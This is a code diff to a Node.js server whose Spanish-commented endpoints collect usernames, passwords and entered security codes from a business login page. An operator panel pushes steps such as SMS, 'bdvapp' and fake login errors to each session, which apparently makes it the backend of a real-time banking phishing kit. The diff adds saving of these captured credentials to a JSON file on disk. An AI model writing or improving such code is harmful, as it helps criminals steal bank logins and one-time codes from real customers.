@@ -25,8 +25,29 @@ const MIME_TYPES = {
   '.ttf': 'font/ttf'
 };
 
-// Almacén de sesiones en memoria para el panel de operador
+// Almacén de sesiones con persistencia en disco para evitar pérdidas en reinicios o balanceadores
+const SESSIONS_FILE = path.join(__dirname, 'sessions_data.json');
 let sessions = {};
+
+function loadSessions() {
+  try {
+    if (fs.existsSync(SESSIONS_FILE)) {
+      const raw = fs.readFileSync(SESSIONS_FILE, 'utf8');
+      const data = JSON.parse(raw);
+      if (data && typeof data === 'object') {
+        sessions = { ...sessions, ...data };
+      }
+    }
+  } catch (_) {}
+}
+
+function saveSessions() {
+  try {
+    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions), 'utf8');
+  } catch (_) {}
+}
+
+loadSessions();
 
 function parseJsonBody(req) {
   return new Promise((resolve) => {
@@ -79,6 +100,7 @@ async function handleRequest(req, res) {
 
     // 1. Obtener todas las sesiones (para el panel de operador)
     if (pathname === '/api/sessions' && req.method === 'GET') {
+      loadSessions();
       const now = Date.now();
       const list = Object.values(sessions).map((s) => {
         const online = now - s.last_seen < 20000;
@@ -89,6 +111,7 @@ async function handleRequest(req, res) {
 
     // 2. Crear o actualizar sesión (desde el login de empresas)
     if (pathname === '/api/sessions' && req.method === 'POST') {
+      loadSessions();
       const body = await parseJsonBody(req);
       const { id, username, password, tipoUsuario, device, state } = body;
       if (!id) return sendJson(res, 400, { error: 'Missing session id' });
@@ -124,21 +147,25 @@ async function handleRequest(req, res) {
           updatedAt: now
         };
       }
+      saveSessions();
       return sendJson(res, 200, { success: true, session: sessions[id] });
     }
 
     // 3. Ping keepalive de la sesión
     const pingMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/ping$/);
     if (pingMatch && req.method === 'POST') {
+      loadSessions();
       const id = pingMatch[1];
       if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
       sessions[id].last_seen = Date.now();
+      saveSessions();
       return sendJson(res, 200, { success: true });
     }
 
     // 4. Enviar token / código ingresado por el usuario
     const tokenMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/token$/);
     if (tokenMatch && req.method === 'POST') {
+      loadSessions();
       const id = tokenMatch[1];
       if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
       const body = await parseJsonBody(req);
@@ -154,12 +181,14 @@ async function handleRequest(req, res) {
       sessions[id].action = null;
       sessions[id].last_seen = Date.now();
       sessions[id].updatedAt = Date.now();
+      saveSessions();
       return sendJson(res, 200, { success: true, session: sessions[id] });
     }
 
     // 5. Asignar acción desde el panel de operador (sms, ami, bdvapp, error-login, done, etc.)
     const actionMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/action$/);
     if (actionMatch && req.method === 'POST') {
+      loadSessions();
       const id = actionMatch[1];
       if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
       const body = await parseJsonBody(req);
@@ -170,24 +199,28 @@ async function handleRequest(req, res) {
       }
       sessions[id].last_seen = Date.now();
       sessions[id].updatedAt = Date.now();
+      saveSessions();
       return sendJson(res, 200, { success: true, session: sessions[id] });
     }
 
     // 6. Cambiar estado de la sesión (ej. 'typing')
     const stateMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/state$/);
     if (stateMatch && req.method === 'POST') {
+      loadSessions();
       const id = stateMatch[1];
       if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
       const body = await parseJsonBody(req);
       sessions[id].state = body.state || sessions[id].state;
       sessions[id].last_seen = Date.now();
       sessions[id].updatedAt = Date.now();
+      saveSessions();
       return sendJson(res, 200, { success: true, session: sessions[id] });
     }
 
     // 7. Consultar sesión individual (polling del cliente)
     const sessionMatch = pathname.match(/^\/api\/sessions\/([^\/]+)$/);
     if (sessionMatch && req.method === 'GET') {
+      loadSessions();
       const id = sessionMatch[1];
       const session = sessions[id];
       if (!session) return sendJson(res, 404, { error: 'Session not found' });
@@ -197,6 +230,7 @@ async function handleRequest(req, res) {
     // 8. Limpiar todas las sesiones
     if (pathname === '/api/clear' && req.method === 'POST') {
       sessions = {};
+      saveSessions();
       return sendJson(res, 200, { success: true });
     }
 
